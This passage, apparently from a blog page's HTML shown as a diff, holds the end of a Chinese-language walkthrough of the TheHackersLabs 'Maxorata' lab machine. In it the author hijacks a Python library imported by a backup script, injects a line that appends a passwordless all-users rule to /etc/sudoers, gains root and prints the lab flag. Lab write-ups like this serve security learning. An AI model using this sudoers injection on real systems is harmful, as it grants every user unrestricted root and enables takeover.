class="string">&quot;%Y%m%d-%H%M%S&quot;</span>)</span><br><span class="line"></span><br><span class="line">def contar_etiquetas(ruta):</span><br><span class="line">    <span class="keyword">if</span> not os.path.isdir(ruta):</span><br><span class="line">        <span class="built_in">return</span> 0</span><br><span class="line">    <span class="built_in">return</span> len([f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(ruta) <span class="keyword">if</span> f.endswith(<span class="string">&quot;.png&quot;</span>)])</span><br></pre></td></tr></table></figure>
+
+<p>正好这里的<code>qrutils.py</code>被<code>backup_etiquetas.py</code>所引用。</p>
+<p>然后我们可以修改注入恶意指令。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;echo &quot;ALL ALL=(ALL:ALL) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>/etc/sudoers</code> 是 Sudo 的核心配置文件，默认只有 root 可写。</li>
+<li>追加的规则 <code>ALL ALL=(ALL:ALL) NOPASSWD:ALL</code> 意思是：任何主机（ALL）上的任何用户（ALL），都可以以任何身份（ALL:ALL）执行任何命令（ALL），且无需密码（NOPASSWD）。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ecabrera@TheHackersLabs-Maxorata:/opt/maxorata/lib$ nano qrutils.py </span><br><span class="line">ecabrera@TheHackersLabs-Maxorata:/opt/maxorata/lib$ <span class="built_in">sudo</span> -i</span><br><span class="line">root@TheHackersLabs-Maxorata:~# </span><br></pre></td></tr></table></figure>
+
+<p>然后就成功提权。</p>
+<p>最后在root路径下找到root flag。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">THL&#123;h1j4ck_d3_l1br3r14_3n_3l_1nsul4r&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">xizi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/09/09/Thehackerslabs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">http://example.com/2026/09/09/Thehackerslabs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">X1z1的个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">靶机渗透</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav id="pagination"><div class="pagination"></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description">CTF Player | PWN</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">43</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xi-zi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">PWN from zero to one .有问题之处，望多海涵。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/09/Thehackerslabs%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="Thehackerslabs刷题记录">Thehackerslabs刷题记录</a><time datetime="2026-09-09T04:38:13.000Z" title="发表于 2026-09-09 12:38:13">2026-09-09</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/09/06/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8%E5%88%9D%E8%B5%9B/" title="磐石行动初赛">磐石行动初赛</a><time datetime="2026-09-06T03:52:16.000Z" title="发表于 2026-09-06 11:52:16">2026-09-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/29/CVE-2018-7034/" title="CVE-2018-7034 信息泄露">CVE-2018-7034 信息泄露</a><time datetime="2026-08-29T06:38:12.000Z" title="发表于 2026-08-29 14:38:12">2026-08-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/21/What-s-the-IPC/" title="What's the IPC">What's the IPC</a><time datetime="2026-08-21T09:59:48.000Z" title="发表于 2026-08-21 17:59:48">2026-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/08/12/Nepctf2026/" title="Nepctf2026">Nepctf2026</a><time datetime="2026-08-12T08:54:35.000Z" title="发表于 2026-08-12 16:54:35">2026-08-12</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/CVE%E5%A4%8D%E7%8E%B0/"><span class="card-category-list-name">CVE复现</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IO/"><span class="card-category-list-name">IO</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/heap/"><span class="card-category-list-name">heap</span><span class="card-category-list-count">9</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/stack/"><span class="card-category-list-name">stack</span><span class="card-category-list-count">12</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/pwn/" style="font-size: 1.5em; color: #99a9bf">pwn</a> <a href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" style="font-size: 1.1em; color: #999">靶机渗透</a> <a href="/tags/pwn%E5%85%A5%E9%97%A8/" style="font-size: 1.37em; color: #99a4b2">pwn入门</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.1em; color: #999">C语言</a> <a href="/tags/pwn%E8%BF%9B%E9%98%B6/" style="font-size: 1.37em; color: #99a4b2">pwn进阶</a> <a href="/tags/IOT/" style="font-size: 1.23em; color: #999ea6">IOT</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      <a class="card-more-btn" href="/archives/"
+            title="查看更多">
+            <i class="fas fa-angle-right"></i>
+          </a>
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/09/">
+            <span class="card-archive-list-date">
+              九月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/08/">
+            <span class="card-archive-list-date">
+              八月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/07/">
+            <span class="card-archive-list-date">
+              七月 2026
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/06/">
+            <span class="card-archive-list-date">
+              六月 2026
+            </span>
+            <span class="card-archive-list-count">1</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/05/">
+            <span class="card-archive-list-date">
+              五月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/04/">
+            <span class="card-archive-list-date">
+              四月 2026
+            </span>
+            <span class="card-archive-list-count">5</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/03/">
+            <span class="card-archive-list-date">
+              三月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              二月 2026
+            </span>
+            <span class="card-archive-list-count">9</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">43</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-09-10T07:34:47.713Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xizi</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/main.min.js"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script id="canvas_nest" defer="defer" color="0,255,255" opacity="0.3" zIndex="-1" count="60" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/search/local-search.min.js"></script></div></div></body></html>
